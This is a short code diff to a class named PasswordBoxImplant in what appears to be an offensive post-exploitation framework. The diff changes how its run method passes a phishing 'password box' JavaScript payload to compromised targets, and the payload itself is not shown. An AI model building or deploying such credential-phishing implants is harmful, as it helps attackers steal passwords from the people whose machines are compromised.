@@ -26,5 +26,5 @@ class PasswordBoxImplant(core.implant.Implant):
 
     def run(self):
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/phish/password_box.js", self.options)
+        payloads["js"] = "data/implant/phish/password_box.js"
         self.dispatch(payloads, self.job)
